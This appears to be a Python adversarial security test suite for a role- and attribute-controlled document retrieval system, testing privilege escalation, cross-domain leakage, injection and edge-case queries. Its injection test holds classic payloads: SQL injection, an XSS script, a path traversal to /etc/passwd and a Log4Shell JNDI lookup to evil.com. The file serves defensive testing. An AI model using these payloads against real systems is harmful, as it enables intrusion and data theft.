"""
Adversarial Testing Suite for CASR Security.

Tests system resistance to:
1. Privilege escalation attacks
2. Cross-domain information leakage
3. Query injection attacks
4. Policy bypass attempts
5. Edge cases and boundary conditions
"""

import asyncio
from typing import List, Dict, Any
from pathlib import Path
import json
from datetime import datetime

from src.models.documents import Document, SecurityClassification
from src.models.users import User, UserRole
from src.models.queries import Query
from src.security.rbac import RBACManager
from src.security.abac import ABACManager
from src.security.policy_engine import PolicyEngine
from src.security.audit import AuditLogger
from src.retrieval.secure_retriever import SecureRetriever
from src.storage.chroma_store import ChromaVectorStore
from src.storage.vector_store import VectorStoreConfig
from src.indexing.embedder import Embedder, EmbeddingProvider
from src.indexing.chunker import Chunker
from benchmarks.dataset_generator import DatasetGenerator


class AdversarialBenchmark:
    """Adversarial testing to probe security limits."""
    
    def __init__(
        self,
        dataset_dir: Path,
        results_dir: Path
    ):
        """
        Initialize adversarial benchmark.
        
        Args:
            dataset_dir: Directory containing test dataset
            results_dir: Directory to save results
        """
        self.dataset_dir = dataset_dir
        self.results_dir = results_dir
        self.results_dir.mkdir(parents=True, exist_ok=True)
        
        # Load dataset
        print("Loading dataset...")
        self.documents, self.queries = DatasetGenerator.load_dataset(dataset_dir)
        print(f"Loaded {len(self.documents)} documents and {len(self.queries)} queries")
        
        # Security components
        self.rbac = RBACManager()
        self.abac = ABACManager()
        self.policy_engine = PolicyEngine()
        self.audit_logger = AuditLogger()
    
    async def _setup_vector_store(self) -> ChromaVectorStore:
        """Set up vector store for testing."""
        config = VectorStoreConfig(
            store_type="chroma",
            collection_name="adversarial_test",
            persist_directory=str(self.results_dir / "temp_stores")
        )
        vector_store = ChromaVectorStore(config)
        
        chunker = Chunker(chunk_size=512, chunk_overlap=50)
        embedder = Embedder(provider=EmbeddingProvider.OPENAI)
        
        print("Indexing documents...")
        for i, doc in enumerate(self.documents):
            if i % 50 == 0:
                print(f"  Indexed {i}/{len(self.documents)}...")
            
            chunks = chunker.chunk_document(doc)
            chunk_texts = [chunk.content for chunk in chunks]
            embeddings = await embedder.embed_texts(chunk_texts)
            
            for chunk, embedding in zip(chunks, embeddings):
                chunk.embeddings = embedding
            
            await vector_store.add_documents(chunks)
        
        return vector_store
    
    async def test_privilege_escalation(self) -> Dict[str, Any]:
        """
        Test privilege escalation attempts.
        
        Attempts:
        1. Low-privilege user accessing high-security documents
        2. Role spoofing in query attributes
        3. Security level manipulation
        
        Returns:
            Privilege escalation test results
        """
        print("\n=== Privilege Escalation Tests ===")
        
        vector_store = await self._setup_vector_store()
        embedder = Embedder(provider=EmbeddingProvider.OPENAI)
        
        secure_retriever = SecureRetriever(
            vector_store=vector_store,
            rbac_manager=self.rbac,
            abac_manager=self.abac,
            policy_engine=self.policy_engine,
            audit_logger=self.audit_logger
        )
        
        results = {
            "attacks": [],
            "successful_blocks": 0,
            "failed_blocks": 0,
            "leaked_documents": []
        }
        
        # Attack 1: Public user trying to access SECRET/TOP_SECRET documents
        print("\nAttack 1: Public user accessing classified documents...")
        
        public_user = User(
            id="attacker_public",
            username="public_attacker",
            email="attacker@public.com",
            roles=[UserRole.PUBLIC_USER],
            attributes={"clearance": "none"}
        )
        
        # Find highly classified documents
        classified_docs = [
            d for d in self.documents
            if d.security_classification in [SecurityClassification.SECRET, SecurityClassification.TOP_SECRET]
        ]
        
        leaked_count = 0
        for doc in classified_docs[:20]:  # Test subset
            # Craft query targeting this document
            words = doc.content.split()[:10]
            query_text = " ".join(words)
            
            try:
                query_embedding = await embedder.embed_query(query_text)
                query_obj = Query(text=query_text, user_id=public_user.id)
                
                search_results = await secure_retriever.retrieve(
                    query=query_obj,
                    user=public_user,
                    query_vector=query_embedding,
                    limit=10
                )
                
                # Check if classified document was returned
                for result in search_results:
                    result_doc_id = result.metadata.get("parent_id", result.id.split("_chunk_")[0])
                    if result_doc_id == doc.id:
                        leaked_count += 1
                        results["leaked_documents"].append({
                            "attack": "privilege_escalation_public",
                            "doc_id": doc.id,
                            "classification": doc.security_classification.value,
                            "user_role": "PUBLIC_USER"
                        })
                        break
            except Exception:
                # Access correctly denied
                results["successful_blocks"] += 1
        
        results["failed_blocks"] += leaked_count
        
        attack_result = {
            "attack_type": "public_user_classified_access",
            "attempts": 20,
            "successful_blocks": results["successful_blocks"],
            "leaked": leaked_count,
            "success_rate": results["successful_blocks"] / 20 if 20 > 0 else 0.0
        }
        results["attacks"].append(attack_result)
        
        print(f"  Blocked: {results['successful_blocks']}/20")
        print(f"  Leaked: {leaked_count}/20 (should be 0)")
        
        # Attack 2: Role attribute manipulation
        print("\nAttack 2: Role attribute manipulation...")
        
        fake_admin = User(
            id="attacker_fake_admin",
            username="fake_admin",
            email="fake@admin.com",
            roles=[UserRole.EMPLOYEE],  # Actually employee
            attributes={
                "role": "admin",  # Fake attribute
                "is_admin": True,
                "clearance": "top_secret"
            }
        )
        
        manipulation_leaked = 0
        for doc in classified_docs[20:40]:
            words = doc.content.split()[:10]
            query_text = " ".join(words)
            
            try:
                query_embedding = await embedder.embed_query(query_text)
                query_obj = Query(text=query_text, user_id=fake_admin.id)
                
                search_results = await secure_retriever.retrieve(
                    query=query_obj,
                    user=fake_admin,
                    query_vector=query_embedding,
                    limit=10
                )
                
                for result in search_results:
                    result_doc_id = result.metadata.get("parent_id", result.id.split("_chunk_")[0])
                    if result_doc_id == doc.id:
                        manipulation_leaked += 1
                        results["leaked_documents"].append({
                            "attack": "attribute_manipulation",
                            "doc_id": doc.id,
                            "classification": doc.security_classification.value,
                            "fake_attributes": fake_admin.attributes
                        })
                        break
            except Exception:
                results["successful_blocks"] += 1
        
        results["failed_blocks"] += manipulation_leaked
        
        attack_result = {
            "attack_type": "attribute_manipulation",
            "attempts": 20,
            "successful_blocks": results["successful_blocks"] - 20,  # Subtract previous
            "leaked": manipulation_leaked,
            "success_rate": (results["successful_blocks"] - 20) / 20 if 20 > 0 else 0.0
        }
        results["attacks"].append(attack_result)
        
        print(f"  Blocked: {attack_result['successful_blocks']}/20")
        print(f"  Leaked: {manipulation_leaked}/20 (should be 0)")
        
        # Cleanup
        await vector_store.delete_collection()
        
        # Save results
        results_file = self.results_dir / "privilege_escalation.json"
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\nResults saved to {results_file}")
        
        return results
    
    async def test_cross_domain_leakage(self) -> Dict[str, Any]:
        """
        Test cross-domain information leakage.
        
        Verifies:
        1. Finance queries don't leak healthcare data
        2. Department isolation is enforced
        3. Project-based access controls work
        
        Returns:
            Cross-domain leakage test results
        """
        print("\n=== Cross-Domain Leakage Tests ===")
        
        vector_store = await self._setup_vector_store()
        embedder = Embedder(provider=EmbeddingProvider.OPENAI)
        
        secure_retriever = SecureRetriever(
            vector_store=vector_store,
            rbac_manager=self.rbac,
            abac_manager=self.abac,
            policy_engine=self.policy_engine,
            audit_logger=self.audit_logger
        )
        
        results = {
            "domain_tests": [],
            "total_leakage": 0
        }
        
        domains = ["finance", "healthcare", "legal", "technology"]
        
        for target_domain in domains:
            print(f"\nTesting {target_domain} domain isolation...")
            
            # Create user with access only to target domain
            domain_user = User(
                id=f"user_{target_domain}",
                username=f"{target_domain}_user",
                email=f"user@{target_domain}.com",
                roles=[UserRole.EMPLOYEE],
                attributes={"department": target_domain, "domain": target_domain}
            )
            
            # Get documents from OTHER domains
            other_domains = [d for d in domains if d != target_domain]
            other_domain_docs = [
                doc for doc in self.documents
                if doc.attributes.get("domain") in other_domains
            ]
            
            leaked_count = 0
            total_attempts = min(30, len(other_domain_docs))
            
            for doc in other_domain_docs[:total_attempts]:
                # Query for document from different domain
                words = doc.content.split()[:10]
                query_text = " ".join(words)
                
                try:
                    query_embedding = await embedder.embed_query(query_text)
                    query_obj = Query(text=query_text, user_id=domain_user.id)
                    
                    search_results = await secure_retriever.retrieve(
                        query=query_obj,
                        user=domain_user,
                        query_vector=query_embedding,
                        limit=10
                    )
                    
                    # Check if cross-domain document was returned
                    for result in search_results:
                        result_doc_id = result.metadata.get("parent_id", result.id.split("_chunk_")[0])
                        result_doc = next((d for d in self.documents if d.id == result_doc_id), None)
                        
                        if result_doc and result_doc.attributes.get("domain") != target_domain:
                            leaked_count += 1
                            break
                
                except Exception:
                    pass  # Correctly blocked
            
            results["domain_tests"].append({
                "domain": target_domain,
                "attempts": total_attempts,
                "leaked": leaked_count,
                "isolation_rate": 1.0 - (leaked_count / total_attempts) if total_attempts > 0 else 1.0
            })
            
            results["total_leakage"] += leaked_count
            
            print(f"  Isolation Rate: {(1.0 - (leaked_count / total_attempts)) * 100:.1f}%")
            print(f"  Leaked: {leaked_count}/{total_attempts}")
        
        # Cleanup
        await vector_store.delete_collection()
        
        # Save results
        results_file = self.results_dir / "cross_domain_leakage.json"
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\nResults saved to {results_file}")
        
        return results
    
    async def test_injection_attacks(self) -> Dict[str, Any]:
        """
        Test query injection attacks.
        
        Attempts:
        1. SQL-like injection patterns
        2. Metadata filter bypass
        3. Special character exploitation
        
        Returns:
            Injection attack test results
        """
        print("\n=== Injection Attack Tests ===")
        
        vector_store = await self._setup_vector_store()
        embedder = Embedder(provider=EmbeddingProvider.OPENAI)
        
        secure_retriever = SecureRetriever(
            vector_store=vector_store,
            rbac_manager=self.rbac,
            abac_manager=self.abac,
            policy_engine=self.policy_engine,
            audit_logger=self.audit_logger
        )
        
        # Malicious query patterns
        injection_queries = [
            "' OR '1'='1",
            "'; DROP TABLE documents; --",
            "admin' --",
            "1' UNION SELECT * FROM users --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%00",
            "\\x00",
            "' OR security_classification='PUBLIC'--",
            "* AND 1=1",
            "OR role IN ('admin', 'security_officer')"
        ]
        
        results = {
            "injection_patterns": [],
            "total_attempts": len(injection_queries),
            "blocked": 0,
            "executed": 0,
            "errors": 0
        }
        
        test_user = User(
            id="injection_tester",
            username="injection_test",
            email="test@injection.com",
            roles=[UserRole.EMPLOYEE],
            attributes={}
        )
        
        for injection_query in injection_queries:
            print(f"\nTesting: {injection_query[:50]}...")
            
            try:
                query_embedding = await embedder.embed_query(injection_query)
                query_obj = Query(text=injection_query, user_id=test_user.id)
                
                search_results = await secure_retriever.retrieve(
                    query=query_obj,
                    user=test_user,
                    query_vector=query_embedding,
                    limit=10
                )
                
                # Query executed - check if it bypassed security
                results["executed"] += 1
                
                # Check if results contain unexpected high-security documents
                for result in search_results:
                    result_doc_id = result.metadata.get("parent_id", result.id.split("_chunk_")[0])
                    result_doc = next((d for d in self.documents if d.id == result_doc_id), None)
                    
                    if result_doc and result_doc.security_classification in [
                        SecurityClassification.SECRET, SecurityClassification.TOP_SECRET
                    ]:
                        results["injection_patterns"].append({
                            "pattern": injection_query,
                            "status": "POTENTIAL_BYPASS",
                            "leaked_doc": result_doc_id,
                            "classification": result_doc.security_classification.value
                        })
                        break
                else:
                    results["injection_patterns"].append({
                        "pattern": injection_query,
                        "status": "SAFE_EXECUTION",
                        "note": "Query executed but no security bypass detected"
                    })
                    results["blocked"] += 1
            
            except Exception as e:
                # Query was blocked or caused an error
                results["errors"] += 1
                results["blocked"] += 1
                results["injection_patterns"].append({
                    "pattern": injection_query,
                    "status": "BLOCKED",
                    "error": str(e)[:100]
                })
                print(f"  Blocked: {str(e)[:50]}")
        
        # Cleanup
        await vector_store.delete_collection()
        
        # Save results
        results_file = self.results_dir / "injection_attacks.json"
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\nInjection Attack Results:")
        print(f"  Total Attempts: {results['total_attempts']}")
        print(f"  Blocked/Safe: {results['blocked']}/{results['total_attempts']}")
        print(f"  Potential Bypasses: {results['total_attempts'] - results['blocked']}")
        print(f"Results saved to {results_file}")
        
        return results
    
    async def test_edge_cases(self) -> Dict[str, Any]:
        """
        Test edge cases and boundary conditions.
        
        Tests:
        1. Empty queries
        2. Extremely long queries
        3. Non-ASCII characters
        4. Null/None values
        5. Concurrent conflicting requests
        
        Returns:
            Edge case test results
        """
        print("\n=== Edge Case Tests ===")
        
        vector_store = await self._setup_vector_store()
        embedder = Embedder(provider=EmbeddingProvider.OPENAI)
        
        secure_retriever = SecureRetriever(
            vector_store=vector_store,
            rbac_manager=self.rbac,
            abac_manager=self.abac,
            policy_engine=self.policy_engine,
            audit_logger=self.audit_logger
        )
        
        test_user = User(
            id="edge_case_tester",
            username="edge_test",
            email="test@edge.com",
            roles=[UserRole.EMPLOYEE],
            attributes={}
        )
        
        edge_cases = [
            ("empty_query", ""),
            ("whitespace_only", "   \n\t  "),
            ("extremely_long", "word " * 10000),
            ("unicode_emoji", "🔒🔑🚀 security document 🎯"),
            ("chinese_chars", "安全文档检索系统"),
            ("arabic_chars", "نظام استرجاع الوثائق الآمن"),
            ("special_chars", "!@#$%^&*()_+-={}[]|\\:;\"'<>,.?/~`"),
            ("repeated_chars", "a" * 1000),
            ("null_like", "null None NULL undefined"),
            ("mixed_case", "SeCuRiTy ClAsSiFiCaTiOn")
        ]
        
        results = {
            "edge_cases": [],
            "handled_correctly": 0,
            "errors": 0
        }
        
        for case_name, query_text in edge_cases:
            print(f"\nTesting: {case_name}...")
            
            try:
                if query_text:  # Can't embed empty string
                    query_embedding = await embedder.embed_query(query_text)
                else:
                    query_embedding = [0.0] * 768  # Dummy embedding
                
                query_obj = Query(text=query_text, user_id=test_user.id)
                
                search_results = await secure_retriever.retrieve(
                    query=query_obj,
                    user=test_user,
                    query_vector=query_embedding,
                    limit=10
                )
                
                results["edge_cases"].append({
                    "case": case_name,
                    "status": "HANDLED",
                    "results_count": len(search_results)
                })
                results["handled_correctly"] += 1
                print(f"  Handled: {len(search_results)} results")
            
            except Exception as e:
                results["edge_cases"].append({
                    "case": case_name,
                    "status": "ERROR",
                    "error": str(e)[:100]
                })
                results["errors"] += 1
                print(f"  Error: {str(e)[:50]}")
        
        # Cleanup
        await vector_store.delete_collection()
        
        # Save results
        results_file = self.results_dir / "edge_cases.json"
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\nEdge Case Results:")
        print(f"  Handled Correctly: {results['handled_correctly']}/{len(edge_cases)}")
        print(f"  Errors: {results['errors']}/{len(edge_cases)}")
        print(f"Results saved to {results_file}")
        
        return results
    
    async def run_all_adversarial_tests(self) -> Dict[str, Any]:
        """Run all adversarial tests."""
        print("\n" + "="*80)
        print("COMPREHENSIVE ADVERSARIAL SECURITY TESTING")
        print("="*80)
        
        results = {}
        
        # Privilege escalation
        results["privilege_escalation"] = await self.test_privilege_escalation()
        
        # Cross-domain leakage
        results["cross_domain_leakage"] = await self.test_cross_domain_leakage()
        
        # Injection attacks
        results["injection_attacks"] = await self.test_injection_attacks()
        
        # Edge cases
        results["edge_cases"] = await self.test_edge_cases()
        
        # Save combined results
        combined_file = self.results_dir / "adversarial_comprehensive.json"
        with open(combined_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n\nCombined adversarial results saved to {combined_file}")
        
        # Summary
        print("\n" + "="*80)
        print("ADVERSARIAL TESTING SUMMARY")
        print("="*80)
        
        total_leaked = results["privilege_escalation"]["failed_blocks"]
        total_cross_domain = results["cross_domain_leakage"]["total_leakage"]
        injection_bypasses = results["injection_attacks"]["total_attempts"] - results["injection_attacks"]["blocked"]
        
        print(f"\nCritical Security Metrics:")
        print(f"  Privilege Escalation Leaks: {total_leaked} (should be 0)")
        print(f"  Cross-Domain Leakage: {total_cross_domain} (should be 0)")
        print(f"  Injection Attack Bypasses: {injection_bypasses} (should be 0)")
        print(f"  Edge Cases Handled: {results['edge_cases']['handled_correctly']}/{len(results['edge_cases']['edge_cases'])}")
        
        if total_leaked == 0 and total_cross_domain == 0 and injection_bypasses == 0:
            print("\n✅ ALL SECURITY TESTS PASSED")
        else:
            print("\n❌ SECURITY VULNERABILITIES DETECTED")
        
        return results


async def main():
    """Run adversarial benchmarks."""
    dataset_dir = Path(__file__).parent / "data" / "test_dataset"
    results_dir = Path(__file__).parent / "results" / "adversarial"
    
    benchmark = AdversarialBenchmark(
        dataset_dir=dataset_dir,
        results_dir=results_dir
    )
    
    await benchmark.run_all_adversarial_tests()


if __name__ == "__main__":
    asyncio.run(main())
